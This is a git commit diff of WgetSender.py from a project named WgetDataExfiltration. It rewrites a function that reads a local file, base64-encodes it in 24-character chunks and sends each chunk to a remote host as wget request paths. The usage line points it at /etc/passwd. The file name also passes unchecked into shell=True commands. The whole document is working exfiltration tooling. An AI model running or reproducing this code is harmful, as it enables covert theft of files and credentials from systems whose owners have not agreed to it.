643ff5215158c81d52ae9fd75d10491b88a87c77
sidhawkss <hawkssid001@gmail.com>
2022-04-15 19:07:36 -0300

    WgetSender: update send-Function

--- WgetSender.py
+++ WgetSender.py
@@ -4,20 +4,24 @@ import subprocess
 import base64
 
 
-def read_file(host, file_name):
-	#Determine a number lines of a file
-	lines  = int(subprocess.check_output(f"cat {file_name} | wc -l", shell=True).decode("utf-8"))
-	#Reading file process
-	for counter in range(1,lines):
-		converted_line = base64.b64encode(subprocess.check_output(f"cat {file_name} | sed -n {counter}p", shell=True))
-		line_txt = str(converted_line.decode("utf-8"))
-		if (len(line_txt) <= 70):
-			print(line_txt)
-			os.system(f"wget -qO- {host}/{line_txt} -O/dev/null")
-		else:
-			half = int(len(line_txt)//2)
-			os.system(f"wget -qO- {host}/{line_txt[:half]} -O/dev/null")
-			os.system(f"wget -qO- {host}/{line_txt[half:]} -O/dev/null")
+def read_sendFile(host, file_name):
+	# File output stream.
+	file_stream = subprocess.check_output(f'/bin/cat {file_name}',shell=True).decode('utf-8')
+
+	# File counter size.
+	file_size = len(file_stream)
+
+	# Loop to iterate in file_stream and send each piece to the server while the counter is small than the original
+	# file characters size.
+	counter,before = 0,0
+	while(counter <= file_size+24):
+		# Get the chunk and convert to base64
+		converted_line = str(base64.b64encode(bytes(file_stream[before:counter], 'utf-8')).decode('utf-8'))
+		# Send chunk to the host.
+		os.system(f'wget -qO- \"{host}/{converted_line}\" -O /dev/null')
+		before = counter
+		counter += 24
+		
 	
 if __name__ == '__main__':
 	banner = """
@@ -28,12 +32,13 @@ if __name__ == '__main__':
 *  https://github.com/sidhawkss/WgetDataExfiltration	*
 =========================================================
 	"""
+	# Running read_file function and print banners and informations.
 	try:
-		read_file(str(sys.argv[1]), str(sys.argv[2]))
+		read_sendFile(str(sys.argv[1]), str(sys.argv[2]))
 		print(banner)
 		print("[*]Sending to the server...")
 	except:
 		print(banner)
 		print("[!]Error on loading the function...\n   You need to provide 2 arguments, the IP of the server and the name of the file.")
-		print("   $ python WgetSender.py 192.168.1.13 \"/etc/passwd\"")
+		print("   Example: $ python WgetSender.py 192.168.1.13 \"/etc/passwd\"")
 		sys.exit(2)
